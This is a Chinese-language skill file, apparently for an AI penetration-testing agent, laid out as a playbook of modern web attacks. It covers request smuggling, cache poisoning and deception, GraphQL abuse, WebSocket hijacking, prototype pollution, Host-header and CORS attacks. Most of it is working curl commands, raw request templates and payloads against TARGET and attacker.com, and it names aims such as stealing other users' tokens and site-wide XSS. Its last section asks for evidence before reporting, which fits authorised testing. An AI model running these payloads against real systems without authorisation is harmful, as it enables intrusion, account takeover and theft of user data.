---
name: modern-web-surface
description: 现代 Web 攻击面（HTTP 请求走私、缓存投毒/欺骗、GraphQL、WebSocket、原型链污染、Host 头攻击、CORS 配置缺陷、CDN 与代理差异）。当意图涉及"走私""缓存""GraphQL 内省""WebSocket 握手""CORS"时读本 skill。
---
# 现代 Web 攻击面 Playbook

## 1. HTTP 请求走私（Smuggling）

**成立条件**：前置代理与后端对 framing 的解析不一致（CL.TE / TE.CL / TE.TE / CL.0、HTTP/2 降级）。

```bash
# 手工探测（Burp Repeater 或 curl --raw 更好控）
curl -s --raw -H "Transfer-Encoding: chunked" -H "Content-Length: 6" \
  -d $'0\r\n\r\nG' http://TARGET/

# TE.CL 模板
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: TARGET
Content-Length: 15

0

```
**要点**：
- 先靠**时间差**判定（走私成功常伴随超时 / 偶发 400），再谈利用。
- 混淆变体：`Transfer-Encoding: xchunked`、`Transfer-Encoding : chunked`（名字后空格）、`\r\nTransfer-Encoding`、双重 TE、`Content-Length` 两个值不同。
- HTTP/2 特有：`TE: trailers` 注入、`content-length` 伪头冲突、`transfer-encoding: chunked` 在 H2 侧被降级。
- 利用价值：绕过前端鉴权直打内网接口、缓存投毒放大、请求排队劫持他人请求（拿到别人 token）。

## 2. 缓存投毒 / 缓存欺骗

```bash
# ① 找 unkeyed 输入：改了不影响缓存 key（响应仍 HIT）但影响内容
X-Forwarded-Host / X-Forwarded-Scheme / X-Host / X-Original-URL
?utm_source= / ?callback= / ?lang=   （很多 CDN 忽略这些做 key）

# ② 判 HIT/MISS
curl -si http://TARGET/ | grep -i "x-cache\|cf-cache-status\|age:"

# ③ 投毒 + 验证
curl -s -H "X-Forwarded-Host: attacker.com" http://TARGET/page
curl -s http://TARGET/page | grep attacker.com   # 无自定义头也命中 = 投毒成功

# ④ 缓存欺骗：让 CDN 缓存"私人数据"给所有人
curl -s http://TARGET/account/profile/nonexistent.css   # 后端忽略后缀返回个人信息，CDN 按 .css 缓存
```
**高价值**：用投毒把 `main.js` 或 `/login` 重定向到自己的主机 → 全站用户中招；缓存键含 Host 时可做**全站 XSS**。

## 3. GraphQL

```bash
# 内省开没开（开了就直接拿全 schema）
curl -s -X POST http://TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name args{name}}}}}"}' | jq .

# 常见缺陷速查
1. 内省关闭不代表安全 → 用 Clairvoyance/字段名爆破字典猜
2. 批量查询绕过限速：别名爆破 —— 一个请求里 1000 个 alias 各试一个验证码
   {"query":"mutation{a1:login(code:\"0001\"){token} a2:login(code:\"0002\"){token}}"}
3. 嵌套深度攻击（DoS）与循环引用（配 rate limit 判断）
4. 字段级越权：query 里加 User.password / token / secret
5. 变量注入：__typename 探测；把 id 换成数组/对象
6. mutation 越权：删掉鉴权头看 mutation 是否仍执行
7. 批量导出：first:999999 / after 分页遍历

# 探测 introspection 与 playground
/graphql /api/graphql /v1/graphql /query  以及 GET 方式的 ?query=
```

## 4. WebSocket

```bash
# 握手观察：是否校验 Origin？是否带 token 在 URL 里？
curl -si -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: http://attacker.com" http://TARGET/ws

# 常见问题
1. wss 但握手无鉴权 → 匿名订阅他人频道（改 roomId/userId）
2. Origin 不校验 → 跨站 WebSocket 劫持（CSWSH）
3. 消息体里带 userId/role → 直接改
4. 订阅消息无权限校验 → 收到别人的实时数据
5. 帧内 JSON 注入 / 非文本帧二进制解析差异
```
容器内可用 python `websockets` 库；注意 upgrade 走代理时用 `--http1.1`。

## 5. 原型链污染（Node/前端）

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
// 合并类库（lodash.merge / jQuery.extend / 递归 merge）→ 污染全局对象
```
**升级路径**：污染 → 触发带 `child_process` 的 gadget（如 EJS 的 `outputFunctionName`、`lodash.template`）→ RCE。前端侧污染 → 绕过前端权限判断。

## 6. Host 头攻击

```
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host / X-Forwarded-Server / Forwarded: host=attacker.com
Host: target.com:evil  /  target.com@attacker.com  /  绝对 URL 形式的请求行
GET http://attacker.com/ HTTP/1.1
```
**后果**：密码重置链接投毒、缓存投毒、SSRF 绕过白名单、路由到内部 vhost。

## 7. CORS 配置缺陷

```bash
curl -si -H "Origin: http://attacker.com" http://TARGET/api/me | grep -i "access-control"
# 危险信号
Access-Control-Allow-Origin: http://attacker.com          # 反射任意源
Access-Control-Allow-Origin: null                        # + document.domain 或 sandbox iframe
Access-Control-Allow-Credentials: true                   # 配合上面 = 可读任意用户数据
Access-Control-Allow-Origin: *  + credentials:true       # 浏览器会拒，但某些实现有洞
# 子域信任：Origin: http://evil.target.com（若有子域接管/XSS 则成立）
```

## 8. 代理 / CDN 差异（做上面几项的前提）

先判清链路：`curl -sv` 看 `Server`、`Via`、`X-Cache`、`CF-Ray`、`X-Served-By`。
路径规范化差异（`/admin` vs `/admin/` vs `//admin` vs `/./admin` vs `%2fadmin`）、大小写、`..;/`（Tomcat）、`;.css` 后缀绕过——**前端拦了但后端放行**就是绕过点。

## 9. 判定与写回

- **走私**：必须给出"一个连接两次请求、第二个响应属于别人的/内部的"的实证，或稳定的 400/超时+后续请求被污染的证据。
- **缓存投毒**：给出"无自定义头也命中恶意内容"的两次 curl 对比。
- **GraphQL/WebSocket**：给出未授权拿到真实数据的响应原文。
- 只是"配置看起来危险"→ 记 inferred，别报 finding。
